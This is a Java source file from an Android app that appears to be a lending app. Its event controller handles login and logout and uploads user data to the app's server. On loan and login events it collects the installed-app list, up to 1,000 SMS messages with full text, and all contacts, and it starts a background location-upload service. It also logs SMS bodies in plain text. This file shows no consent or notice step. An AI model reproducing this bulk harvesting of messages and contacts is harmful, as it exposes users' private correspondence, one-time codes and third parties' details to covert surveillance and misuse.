package com.xulu.xnpacket.events;


import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.text.TextUtils;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;

import com.orhanobut.logger.Logger;
import com.xulu.xnpacket.app.App;
import com.xulu.xnpacket.app.JPushManager;
import com.xulu.xnpacket.bean.AppInfo;
import com.xulu.xnpacket.bean.UserSmsInfoBean;
import com.xulu.xnpacket.config.Constant;
import com.xulu.xnpacket.ui.authentication.bean.ContactBean;
import com.xulu.xnpacket.ui.lend.contract.UploadContentsContract;
import com.xulu.xnpacket.ui.lend.presenter.UploadContentsPresenter;
import com.xulu.xnpacket.ui.login.activity.RegisterPhoneActivity;
import com.xulu.xnpacket.ui.login.contract.LoginOutContract;
import com.xulu.xnpacket.ui.login.presenter.LoginOutPresenter;
import com.xulu.xnpacket.ui.main.MainActivity;
import com.xulu.xnpacket.ui.my.bean.UserInfoBean;
import com.xulu.xnpacket.util.ContactsUploadUtil;
import com.xulu.xnpacket.util.ConvertUtil;
import com.xulu.xnpacket.util.LogUtils;
import com.xulu.xnpacket.util.ServiceUtil;
import com.xulu.xnpacket.util.SpUtil;
import com.xulu.xnpacket.util.StringUtil;

import org.greenrobot.eventbus.EventBus;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import rx.Observable;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.functions.Action1;
import rx.schedulers.Schedulers;


public class EventController implements UploadContentsContract.View {

    private static volatile EventController instance = null;
    private UploadContentsPresenter mUploadPresenter;
    private Context mContext;
    private EventController() {

    };

    /******
     * 获取单例
     *
     * @return
     */
    public static EventController getInstance() {
        if (instance == null) {
            synchronized (EventController.class) {

                if (instance == null) {
                    instance = new EventController();
                }

            }
        }
        return instance;
    }


    /**********
     * eventBus 事件派发
     *
     * @param event
     */
    public void handleMessage(final BaseEvent event) {
        if (event.getUiEvent() == null) {
            //登录
            if (event instanceof LoginEvent) {
                //登陆成功后，更新极光推送的别名
                JPushManager.get().registerJPushAlias();
                saveUserInfo(((LoginEvent) event).getBean(), ((LoginEvent) event).getContext());
                if (((LoginEvent) event).isToNext()) {
                    EventBus.getDefault().post(new RefreshUIEvent(UIBaseEvent.EVENT_LOGIN));//是点哪个页面跳转的登录，登录后就跳转到点击的页面
                }
            } else if (event instanceof LogoutEvent)//退出
            {
                logOut((LogoutEvent) event);
            }  else if (event instanceof LoginNoRefreshUIEvent) {//启动app时保存用户数据
                saveUserInfo(((LoginNoRefreshUIEvent) event).getBean(), ((LoginNoRefreshUIEvent) event).getContext());
            } else if (event instanceof LoanEvent) {
                mUploadPresenter = new UploadContentsPresenter();
                mUploadPresenter.init(this);
                mContext = ((LoanEvent) event).getContext();
                sendAPP();
            }
        }
    }

    private void sendAPP() {
        Observable.create(new Observable.OnSubscribe<List<AppInfo>>() {
            @Override
            public void call(Subscriber<? super List<AppInfo>> subscriber) {
                try {
                    subscriber.onNext(getAppInfoList(mContext));
                    subscriber.onCompleted();
                } catch (Exception e) {
                    subscriber.onError(e);
                }
            }
        }).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Action1<List<AppInfo>>() {
                    @Override
                    public void call(List<AppInfo> appInfos) {
                        mUploadPresenter.toUploadContents(mUploadPresenter.TYPE_APP,ConvertUtil.toJsonString(appInfos));
                    }});
    }

    private void sendSMS() {
        Observable.create(new Observable.OnSubscribe<List<UserSmsInfoBean>>() {
            @Override
            public void call(Subscriber<? super List<UserSmsInfoBean>> subscriber) {
                try {
                    subscriber.onNext(getSmsInfoList(mContext));
                    subscriber.onCompleted();
                } catch (Exception e) {
                    subscriber.onError(e);
                }
            }
        }).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Action1<List<UserSmsInfoBean>>() {
                    @Override
                    public void call(List<UserSmsInfoBean> userSmsInfoBeen) {
                        mUploadPresenter.toUploadContents(mUploadPresenter.TYPE_SMS,ConvertUtil.toJsonString(userSmsInfoBeen));
                    }});
    }

    private List<UserSmsInfoBean> getSmsInfoList(Context context) {

        List<UserSmsInfoBean> list = new ArrayList<>();
        Uri SMS_INBOX = Uri.parse("content://sms/");
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        //String where = "date>" + (System.currentTimeMillis() - 15552000000l);//30天 = 30*24*60*60*1000ms = 2592000000ms
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (cur != null && cur.moveToFirst()) {
            LogUtils.loge("cur" + cur.getColumnCount());
            int phoneNumberColumn = cur.getColumnIndex("address");
            int dateColumn = cur.getColumnIndex("date");
            int bodyColumn = cur.getColumnIndex("body");
            do {
                String phoneNumber;
                String date;
                String body;
                phoneNumber = cur.getString(phoneNumberColumn);
                body = cur.getString(bodyColumn);
                SimpleDateFormat dateFormat = new SimpleDateFormat(
                        "yyyy-MM-dd HH:mm:ss");
                Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                date = dateFormat.format(d);
                UserSmsInfoBean mUserSmsInfo = new UserSmsInfoBean();
                mUserSmsInfo.setMessageContent(body);
                mUserSmsInfo.setMessageDate(date);
                mUserSmsInfo.setPhone(phoneNumber);
                mUserSmsInfo.setUserId(App.getConfig().getUserInfo().getUid());
                LogUtils.loge("输出手机中的 number=" + "--内容body=" + body + "--data=" + date + "--phoneNumber=" + phoneNumber);
                if (list.size() < 1000) {
                    list.add(mUserSmsInfo);
                } else {
                    cur.moveToLast();
                }

            } while (cur.moveToNext());
            if (!cur.isClosed()) {
                cur.close();
            }
        }
        return list;
    }


    /**********
     * 退出
     *
     * @param event
     */
    private void logOut(LogoutEvent event) {

        EventBus.getDefault().post(new RefreshUIEvent(UIBaseEvent.EVENT_LOGOUT));
        Intent intent = new Intent(event.getApplicationContext(), MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
        event.getContext().startActivity(intent);

        String uName = SpUtil.getString(Constant.CACHE_TAG_USERNAME);
        Intent loginIntent = new Intent(App.getContext(), RegisterPhoneActivity.class);
        intent.putExtra("phone", uName);
        App.getContext().startActivity(intent);
       /* Intent loginIntent=new Intent(App.getContext(),LoginActivity.class);
        loginIntent.putExtra("tag", StringUtil.changeMobile(uName));
        loginIntent.putExtra("phone", uName);*/
        loginIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        App.getContext().startActivity(loginIntent);
        clearLoginStatus(App.getContext(),event.getTAG());
        ServiceUtil.cancelAlarmManager(App.getContext());
    }


    /************
     * 清除登录状态
     */
    public static void clearLoginStatus(Context context,int tag) {
        SpUtil.putString(Constant.CACHE_TAG_SESSIONID, "");
        SpUtil.putString(Constant.CACHE_TAG_UID, "");
        //SpUtil.putString(Constant.SHARE_TAG_USERNAME, "");
        App.getConfig().setUserInfo(null);
        //清除cookie
        CookieSyncManager.createInstance(context);
        CookieManager cm = CookieManager.getInstance();
        cm.removeAllCookie();
        CookieSyncManager.getInstance().sync();
        if (tag==0){
            LoginOutPresenter loginOutPresenter=new LoginOutPresenter();
            loginOutPresenter.init(new LoginOutContract.View() {
                @Override
                public void loginOutSuccess() {}
                @Override
                public void showLoading(String content) {}
                @Override
                public void stopLoading() {}
                @Override
                public void showErrorMsg(String msg, String type) {}
            });
            loginOutPresenter.loginOut();
        }
    }

    /********
     * 登录成功后保存用户信息
     *
     * @param userInfo
     */
    private void saveUserInfo(UserInfoBean userInfo, Context context) {
        if (userInfo != null) {
            SpUtil.putString(Constant.CACHE_TAG_USERNAME, userInfo.getUsername());
            SpUtil.putString(Constant.CACHE_TAG_UID, userInfo.getUid() + "");
            SpUtil.putString(Constant.CACHE_TAG_SESSIONID, userInfo.getSessionid());
            SpUtil.putString(Constant.CACHE_TAG_REAL_NAME, userInfo.getRealname());

            App.getConfig().setUserInfo(userInfo);

            CookieSyncManager.createInstance(context);
            CookieManager cm = CookieManager.getInstance();
            String cookie = "SESSIONID=" + userInfo.getSessionid() + ";UID=" + userInfo.getUid();
            cm.setCookie(App.getConfig().getBaseUrl(), cookie);
            CookieSyncManager.getInstance().sync();
            cacheUserInfo(userInfo, context);
            try {
                uploadContact();
            }catch (RuntimeException e){
                e.printStackTrace();
                LogUtils.loge("联系人获取异常");
            }

            //判断service是否开启
            if (!ServiceUtil.isServiceRunning(context, "com.xulu.xnpacket.ui.my.service.UploadPOIService")) {
                ServiceUtil.invokeTimerPOIService(context);
            }
            EventBus.getDefault().post(new FragmentRefreshEvent(UIBaseEvent.EVENT_LOGIN));
        }
    }
    /*************
     * 上传联系人
     */
    public  void uploadContact()
    {
        if (mUploadPresenter==null){
            mUploadPresenter = new UploadContentsPresenter();
            mUploadPresenter.init(this);
        }
        Observable.create(new Observable.OnSubscribe<List<ContactBean>>() {
            @Override
            public void call(Subscriber<? super List<ContactBean>> subscriber) {
                try {
                    List<ContactBean> list = ContactsUploadUtil.getAllContacts(mContext);
                    subscriber.onNext(list);
                    subscriber.onCompleted();
                } catch (Exception e) {
                    subscriber.onError(e);
                }
            }
        }).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Action1<List<ContactBean>>() {
                    @Override
                    public void call(List<ContactBean> contactBeen) {
                        if (contactBeen!=null&&contactBeen.size()>0){
                            String data = ConvertUtil.toJsonString(contactBeen);
                            mUploadPresenter.toUploadContents(mUploadPresenter.TYPE_CONTACT,data);
                        }
                    }
                });
    }
    /**
     * 获取手机安装的app列表
     *
     * @param context
     * @return
     */
    private List<AppInfo> getAppInfoList(Context context) {
    // 获取手机中所有已安装的应用，并判断是否系统应用
        ArrayList<AppInfo> appList = new ArrayList<>(); //用来存储获取的应用信息数据，手机上安装的应用数据都存在appList里
        List<PackageInfo> packages = context.getPackageManager().getInstalledPackages(0);

        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = packages.get(i);
            //判断是否系统应用
            if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                //非系统应用
                AppInfo tmpInfo = new AppInfo();
                tmpInfo.setAppName(packageInfo.applicationInfo.loadLabel(context.getPackageManager()).toString());
                tmpInfo.setPackageName(packageInfo.packageName);
                tmpInfo.setVersionCode(packageInfo.versionCode);
                tmpInfo.setVersionName(packageInfo.versionName);
                if (App.getConfig().getUserInfo()!=null){
                    tmpInfo.setUserId(App.getConfig().getUserInfo().getUid());
                }
                appList.add(tmpInfo);
            } else {
                //系统应用　　　　　　　　
            }
        }
        return appList;
    }

    /**
     * 保存用户信息到本地缓存
     *
     * @param bean
     * @param context
     */
    private void cacheUserInfo(UserInfoBean bean, Context context) {
        if (TextUtils.isEmpty(SpUtil.getString(Constant.CACHE_TAG_REAL_NAME))) {
            SpUtil.putString(Constant.CACHE_TAG_REAL_NAME,  bean.getRealname());
        }
        if (TextUtils.isEmpty(SpUtil.getString(Constant.CACHE_TAG_USERNAME))) {
            SpUtil.putString(Constant.CACHE_TAG_USERNAME, bean.getUsername());
        }
        String userListStr = SpUtil.getString(Constant.CACHE_USERLIST_KEY);
        List userList = null;
        if (StringUtil.isBlank(userListStr)) {
            userList = new ArrayList();
        } else {
            userList = ConvertUtil.StringToList(userListStr);
        }

        if (userList.indexOf(bean.getUsername()) < 0) {
            userList.add(bean.getUsername());
        }
        SpUtil.putString(Constant.CACHE_USERLIST_KEY, ConvertUtil.ListToString(userList));
    }

    @Override
    public void uploadSuccess(String type) {
        if (type ==mUploadPresenter.TYPE_APP){
            Logger.t("upload_content").e("应用列表上传成功");
            sendSMS();
        }else if (type ==mUploadPresenter.TYPE_CONTACT){
            Logger.t("upload_content").e("联系人列表上传成功");
        }else if (type ==mUploadPresenter.TYPE_SMS){
            Logger.t("upload_content").e("短信列表上传成功");
        }
    }

    @Override
    public void showLoading(String content) {

    }

    @Override
    public void stopLoading() {

    }

    @Override
    public void showErrorMsg(String msg, String type) {
        if (type ==mUploadPresenter.TYPE_APP){
            Logger.t("upload_content").e("应用列表上传失败");
            sendSMS();
        }else if (type ==mUploadPresenter.TYPE_CONTACT){
            Logger.t("upload_content").e("联系人列表上传失败");
        }else if (type ==mUploadPresenter.TYPE_SMS){
            Logger.t("upload_content").e("短信列表上传失败");
        }
    }
}
